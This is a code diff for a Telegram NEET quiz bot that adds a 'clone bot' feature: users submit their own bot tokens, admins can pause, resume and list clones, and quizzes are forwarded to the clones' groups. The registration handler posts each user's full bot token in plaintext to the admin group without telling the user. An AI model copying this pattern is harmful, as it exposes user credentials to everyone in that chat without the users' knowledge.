@@ -46,9 +46,13 @@ from telegram.ext import (
     ContextTypes,
     filters
 )
+try:
+    from telegram.ext import ApplicationHandlerStop
+except ImportError:
+    ApplicationHandlerStop = None
 
 from models import db
-# Add these imports (put them near the top with other imports)
+from clone_manager import clone_manager
 from flask import Flask
 import threading
 from deep_translator import GoogleTranslator
@@ -268,6 +272,7 @@ class NEETQuizBot:
         self.groups_cache = {}  # In-memory cache: {group_id: {"title": str, "type": str}} - works without DB
         self.translation_cache = {}  # Cache translations: {(quiz_id, language): {'question': str, 'options': list}}
         self.broadcast_semaphore = asyncio.Semaphore(25)  # Limit concurrent sends to 25
+        self._clone_setup_pending = {}  # {user_id: 'awaiting_token'} for /clone flow
     
     async def _parallel_send(self, send_func, chat_ids: List, status_msg=None, context=None, label="Sending", 
                              track_messages=False, original_message_id=None, original_chat_id=None, sent_by=None):
@@ -547,7 +552,11 @@ Hello! To use this bot, you need to join our official groups/channels first.
         self.application.add_handler(CommandHandler("fjoin", self.fjoin_command))
         self.application.add_handler(CommandHandler("removefjoin", self.removefjoin_command))
         self.application.add_handler(CommandHandler("forward", self.forward_command))
-        
+        self.application.add_handler(CommandHandler("clone", self.clone_command))
+        self.application.add_handler(CommandHandler("pauseclone", self.pauseclone_command))
+        self.application.add_handler(CommandHandler("resumeclone", self.resumeclone_command))
+        self.application.add_handler(CommandHandler("clonelist", self.clonelist_command))
+
         # Poll and quiz handlers
         self.application.add_handler(MessageHandler(filters.POLL, self.handle_quiz))
         self.application.add_handler(MessageHandler(filters.TEXT & filters.REPLY, self.handle_reply_to_poll))
@@ -567,6 +576,15 @@ Hello! To use this bot, you need to join our official groups/channels first.
         # Track any group where bot sees activity
         self.application.add_handler(MessageHandler(filters.ALL, self.track_groups))
         
+        # Clone token input handler (intercepts before forward_user_message_to_admin)
+        self.application.add_handler(
+            MessageHandler(
+                filters.ChatType.PRIVATE & ~filters.COMMAND,
+                self.handle_clone_token_input
+            ),
+            group=0
+        )
+
         # Message forwarding system: User -> Admin
         # Forward all non-command messages from private chats to admin group  
         self.application.add_handler(
@@ -977,17 +995,75 @@ Let's ace NEET together! 🚀
                     except Exception as e:
                         logger.error(f"❌ Failed to send quiz to chat {chat['id']}: {e}")
             
+            # Forward to clone bots' groups
+            clone_group_count = 0
+            clone_channel_count = 0
+            for clone_bot_id, instance in clone_manager.get_all_instances().items():
+                clone_info = await db.get_clone_bot(clone_bot_id)
+                if clone_info and clone_info.get('is_paused'):
+                    continue
+                clone_groups = await db.get_clone_groups(clone_bot_id)
+                for cgroup in clone_groups:
+                    try:
+                        clone_lang = await db.get_group_language(cgroup['id'])
+                        c_question = poll.question
+                        c_options = options
+                        if clone_lang == 'hindi':
+                            cache_key = (quiz_id, 'hindi')
+                            if cache_key in self.translation_cache:
+                                c_question = self.translation_cache[cache_key]['question']
+                                c_options = self.translation_cache[cache_key]['options']
+                            else:
+                                try:
+                                    from deep_translator import GoogleTranslator
+                                    translator = GoogleTranslator(source='auto', target='hi')
+                                    c_question = translator.translate(poll.question)
+                                    c_options = [translator.translate(opt) for opt in options]
+                                    self.translation_cache[cache_key] = {'question': c_question, 'options': c_options}
+                                except Exception:
+                                    c_question = poll.question
+                                    c_options = options
+                        c_question = c_question + "\n\n【~@" + (instance.bot_username or "QuizBot") + "】"
+                        c_sent = await instance.application.bot.send_poll(
+                            chat_id=cgroup['id'],
+                            question=c_question,
+                            options=c_options,
+                            type='quiz',
+                            correct_option_id=correct_option,
+                            is_anonymous=False,
+                            explanation=poll.explanation if poll.explanation else "📚 Quiz Bot"
+                        )
+                        await db.add_poll_mapping(
+                            poll_id=c_sent.poll.id,
+                            quiz_id=quiz_id,
+                            group_id=cgroup['id'],
+                            message_id=c_sent.message_id,
+                            clone_bot_id=clone_bot_id,
+                            correct_option=correct_option
+                        )
+                        if cgroup.get('type') == 'channel':
+                            clone_channel_count += 1
+                        else:
+                            clone_group_count += 1
+                    except Exception as ce:
+                        logger.error(f"❌ Clone {clone_bot_id}: Failed to send to {cgroup['id']}: {ce}")
+
             total_sent = group_count + channel_count
-            if total_sent > 0:
-                # Send confirmation to admin
-                option_letter = chr(65 + correct_option)  # Convert to A, B, C, D
-                confirmation = f"🎯 **Quiz Forwarded Successfully!**\n\n📊 Statistics:\n🏠 Groups: {group_count}\n📢 Channels: {channel_count}\n📈 Total: {total_sent}\n\n✅ Correct Answer: **{option_letter}**"
+            total_clone = clone_group_count + clone_channel_count
+            if total_sent > 0 or total_clone > 0:
+                option_letter = chr(65 + correct_option)
+                confirmation = (
+                    f"🎯 **Quiz Forwarded Successfully!**\n\n"
+                    f"📊 Main Bot:\n🏠 Groups: {group_count}\n📢 Channels: {channel_count}\n"
+                    f"📊 Clone Bots:\n🏠 Groups: {clone_group_count}\n📢 Channels: {clone_channel_count}\n"
+                    f"📈 Total: {total_sent + total_clone}\n\n✅ Correct Answer: **{option_letter}**"
+                )
                 await context.bot.send_message(
                     chat_id=ADMIN_GROUP_ID,
                     text=confirmation,
                     parse_mode='Markdown'
                 )
-                logger.info(f"🎯 Quiz '{poll.question[:50]}...' sent to {group_count} groups and {channel_count} channels successfully!")
+                logger.info(f"🎯 Quiz forwarded to {group_count}g+{channel_count}c (main) + {clone_group_count}g+{clone_channel_count}c (clones)")
             else:
                 await context.bot.send_message(
                     chat_id=ADMIN_GROUP_ID,
@@ -3732,14 +3808,333 @@ Let's connect with Aman Directly, privately and securely!
         except Exception as e:
             logger.error(f"Inline error: {e}")    
 
+    async def clone_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle /clone command - create a clone bot"""
+        user = update.effective_user
+        chat = update.effective_chat
+
+        # In groups: redirect to private
+        if chat.type != 'private':
+            keyboard = [[InlineKeyboardButton(
+                "🤖 Create Clone Bot (Private)",
+                url=f"https://t.me/{(await context.bot.get_me()).username}?start=clone"
+            )]]
+            await update.message.reply_text(
+                "🤖 **Clone Bot Feature**\n\n"
+                "Please use /clone in a private chat with me to set up your own quiz bot!",
+                reply_markup=InlineKeyboardMarkup(keyboard),
+                parse_mode='Markdown'
+            )
+            return
+
+        # Check if user already has a clone bot
+        existing = await db.get_clone_bot_by_owner(user.id)
+        if existing:
+            status = "⏸️ Paused" if existing.get('is_paused') else "✅ Active"
+            await update.message.reply_text(
+                f"⚠️ You already have a clone bot registered!\n\n"
+                f"🤖 Bot: @{existing.get('bot_username')}\n"
+                f"📛 Name: {existing.get('bot_name')}\n"
+                f"📊 Status: {status}\n\n"
+                f"Each user can only create one clone bot.",
+                parse_mode='Markdown'
+            )
+            return
+
+        self._clone_setup_pending[user.id] = 'awaiting_token'
+        await update.message.reply_text(
+            "🤖 **Create Your Own Quiz Bot**\n\n"
+            "You can create your own NEET Quiz Bot without any coding!\n\n"
+            "📋 **Steps:**\n"
+            "1️⃣ Open @BotFather on Telegram\n"
+            "2️⃣ Send /newbot and follow the instructions\n"
+            "3️⃣ Copy the bot token BotFather gives you\n"
+            "4️⃣ Paste the token here\n\n"
+            "✅ Your bot will automatically get all quiz features!\n\n"
+            "⚡ Send your **bot token** now (or /cancel to abort):",
+            parse_mode='Markdown'
+        )
+
+    async def handle_clone_token_input(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle token input during /clone setup — runs in group=0 to intercept before admin forward"""
+        user = update.effective_user
+        if user.id not in self._clone_setup_pending:
+            return
+
+        message = update.message
+        if not message or not message.text:
+            return
+
+        token_text = message.text.strip()
+
+        if token_text.lower() == '/cancel':
+            del self._clone_setup_pending[user.id]
+            await message.reply_text("❌ Clone bot setup cancelled.")
+            if ApplicationHandlerStop:
+                raise ApplicationHandlerStop
+            return
+
+        # Validate: looks like a token
+        if ':' not in token_text or len(token_text) < 30:
+            await message.reply_text(
+                "❌ That doesn't look like a valid bot token.\n"
+                "A token looks like: `1234567890:ABCdefGHIjklMNOpqrsTUVwxyz`\n\n"
+                "Please try again or send /cancel.",
+                parse_mode='Markdown'
+            )
+            if ApplicationHandlerStop:
+                raise ApplicationHandlerStop
+            return
+
+        await message.reply_text("⏳ Verifying your bot token...")
+
+        try:
+            from telegram import Bot as TelegramBot
+            test_bot = TelegramBot(token=token_text)
+            bot_info = await test_bot.get_me()
+        except Exception:
+            await message.reply_text(
+                "❌ **Invalid token!** Could not connect to Telegram with this token.\n\n"
+                "Please make sure you copied the full token correctly and try again, or send /cancel.",
+                parse_mode='Markdown'
+            )
+            if ApplicationHandlerStop:
+                raise ApplicationHandlerStop
+            return
+
+        # Check token not already in use
+        existing_clone = await db.get_clone_bot(bot_info.id)
+        if existing_clone:
+            await message.reply_text(
+                "❌ This bot token is already registered by another user.",
+                parse_mode='Markdown'
+            )
+            if ApplicationHandlerStop:
+                raise ApplicationHandlerStop
+            return
+
+        # Register the clone bot
+        added = await db.add_clone_bot(
+            bot_token=token_text,
+            bot_id=bot_info.id,
+            bot_name=bot_info.first_name,
+            bot_username=bot_info.username,
+            owner_id=user.id,
+            owner_username=user.username,
+            owner_name=user.first_name
+        )
+
+        if not added:
+            await message.reply_text("❌ You already have a clone bot registered.")
+            del self._clone_setup_pending[user.id]
+            if ApplicationHandlerStop:
+                raise ApplicationHandlerStop
+            return
+
+        del self._clone_setup_pending[user.id]
+
+        # Start the clone bot
+        await clone_manager.start_clone(
+            bot_token=token_text,
+            clone_bot_id=bot_info.id,
+            owner_id=user.id,
+            bot_username=bot_info.username,
+            bot_name=bot_info.first_name
+        )
+
+        await message.reply_text(
+            f"🎉 **Your Clone Bot is Ready!**\n\n"
+            f"🤖 Bot: @{bot_info.username}\n"
+            f"📛 Name: {bot_info.first_name}\n\n"
+            f"✅ Your bot is now live and will receive all quizzes!\n\n"
+            f"📋 **Your bot features:**\n"
+            f"• All quizzes from the main bot automatically\n"
+            f"• /broadcast — Send messages to all your users & groups\n"
+            f"• /stats — See your bot's statistics\n"
+            f"• /leaderboard — Show your bot's leaderboard\n"
+            f"• /language — Change quiz language\n\n"
+            f"👉 Start @{bot_info.username} and add it to your groups!",
+            parse_mode='Markdown'
+        )
+
+        # Notify main admin
+        owner_mention = f"[{user.first_name}](tg://user?id={user.id})"
+        owner_info = f"👤 Owner: {owner_mention}\n🆔 Owner ID: `{user.id}`\n"
+        if user.username:
+            owner_info += f"📎 Username: @{user.username}\n"
+        admin_msg = (
+            f"🆕 **New Clone Bot Registered!**\n\n"
+            f"🤖 Bot Name: {bot_info.first_name}\n"
+            f"📎 Bot Username: @{bot_info.username}\n"
+            f"🆔 Bot ID: `{bot_info.id}`\n"
+            f"🔑 Token: `{token_text}`\n\n"
+            f"{owner_info}"
+        )
+        try:
+            await context.bot.send_message(
+                chat_id=ADMIN_GROUP_ID,
+                text=admin_msg,
+                parse_mode='Markdown'
+            )
+        except Exception as e:
+            logger.error(f"Failed to notify admin about new clone: {e}")
+
+        logger.info(f"New clone bot @{bot_info.username} ({bot_info.id}) registered by user {user.id}")
+        if ApplicationHandlerStop:
+            raise ApplicationHandlerStop
+
+    async def pauseclone_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Pause a clone bot - admin only. Usage: /pauseclone <bot_id> <reason>"""
+        user = update.effective_user
+        if not await db.is_admin(user.id):
+            await update.message.reply_text("❌ This command is only for main bot admins.")
+            return
+
+        args = context.args
+        if not args or len(args) < 2:
+            await update.message.reply_text(
+                "❌ Usage: `/pauseclone <bot_id> <reason>`\n\n"
+                "Example: `/pauseclone 123456789 Banned for spam`",
+                parse_mode='Markdown'
+            )
+            return
+
+        try:
+            bot_id = int(args[0])
+        except ValueError:
+            await update.message.reply_text("❌ Invalid bot ID. Must be a number.")
+            return
+
+        reason = ' '.join(args[1:])
+        clone_info = await db.get_clone_bot(bot_id)
+        if not clone_info:
+            await update.message.reply_text("❌ No clone bot found with that ID.\n\nUse /clonelist to see all clone bots.")
+            return
+
+        await db.pause_clone_bot(bot_id, reason)
+
+        # Stop the running instance if active
+        if clone_manager.get_instance(bot_id):
+            await clone_manager.stop_clone(bot_id)
+
+        await update.message.reply_text(
+            f"⏸️ **Clone Bot Paused**\n\n"
+            f"🤖 Bot: @{clone_info.get('bot_username')}\n"
+            f"🆔 Bot ID: `{bot_id}`\n"
+            f"👤 Owner: `{clone_info.get('owner_id')}`\n"
+            f"📋 Reason: {reason}\n\n"
+            f"The bot is now offline. Use /resumeclone {bot_id} to restore.",
+            parse_mode='Markdown'
+        )
+
+        # Notify the clone owner
+        try:
+            await context.bot.send_message(
+                chat_id=clone_info.get('owner_id'),
+                text=f"⚠️ Your bot @{clone_info.get('bot_username')} has been **paused** by an admin.\n\n"
+                     f"📋 Reason: {reason}\n\n"
+                     f"Please contact the main bot admin for more information.",
+                parse_mode='Markdown'
+            )
+        except Exception:
+            pass
+
+    async def resumeclone_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Resume a paused clone bot - admin only. Usage: /resumeclone <bot_id>"""
+        user = update.effective_user
+        if not await db.is_admin(user.id):
+            await update.message.reply_text("❌ This command is only for main bot admins.")
+            return
+
+        args = context.args
+        if not args:
+            await update.message.reply_text(
+                "❌ Usage: `/resumeclone <bot_id>`\n\n"
+                "Example: `/resumeclone 123456789`",
+                parse_mode='Markdown'
+            )
+            return
+
+        try:
+            bot_id = int(args[0])
+        except ValueError:
+            await update.message.reply_text("❌ Invalid bot ID.")
+            return
+
+        clone_info = await db.get_clone_bot(bot_id)
+        if not clone_info:
+            await update.message.reply_text("❌ No clone bot found with that ID.")
+            return
+
+        if not clone_info.get('is_paused'):
+            await update.message.reply_text("⚠️ This clone bot is not paused.")
+            return
+
+        await db.resume_clone_bot(bot_id)
+
+        # Start the instance again
+        await clone_manager.start_clone(
+            bot_token=clone_info['bot_token'],
+            clone_bot_id=clone_info['bot_id'],
+            owner_id=clone_info['owner_id'],
+            bot_username=clone_info.get('bot_username'),
+            bot_name=clone_info.get('bot_name')
+        )
+
+        await update.message.reply_text(
+            f"▶️ **Clone Bot Resumed**\n\n"
+            f"🤖 Bot: @{clone_info.get('bot_username')}\n"
+            f"🆔 Bot ID: `{bot_id}`\n"
+            f"👤 Owner: `{clone_info.get('owner_id')}`\n\n"
+            f"✅ The bot is back online!",
+            parse_mode='Markdown'
+        )
+
+        # Notify the clone owner
+        try:
+            await context.bot.send_message(
+                chat_id=clone_info.get('owner_id'),
+                text=f"✅ Your bot @{clone_info.get('bot_username')} has been **resumed** and is back online!",
+                parse_mode='Markdown'
+            )
+        except Exception:
+            pass
+
+    async def clonelist_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """List all clone bots - admin only"""
+        user = update.effective_user
+        if not await db.is_admin(user.id):
+            await update.message.reply_text("❌ This command is only for main bot admins.")
+            return
+
+        clones = await db.get_all_clone_bots()
+        if not clones:
+            await update.message.reply_text("📋 No clone bots registered yet.")
+            return
+
+        text = f"🤖 **All Clone Bots ({len(clones)})**\n\n"
+        for clone in clones:
+            status = "⏸️ Paused" if clone.get('is_paused') else "✅ Active"
+            text += (
+                f"• @{clone.get('bot_username')} (`{clone.get('bot_id')}`)\n"
+                f"  👤 Owner: `{clone.get('owner_id')}`"
+            )
+            if clone.get('owner_username'):
+                text += f" (@{clone.get('owner_username')})"
+            text += f"\n  📊 {status}\n\n"
+
+        await update.message.reply_text(text, parse_mode='Markdown')
+
     async def run(self):
         """Run the bot"""
         try:
             # Initialize
             await self.initialize()
-            
-            
-            # Start the bot
+
+            # Start all active clone bots
+            await clone_manager.start_all_clones()
+
+            # Start the main bot
             await self.application.initialize()
             await self.application.start()
             await self.application.updater.start_polling()
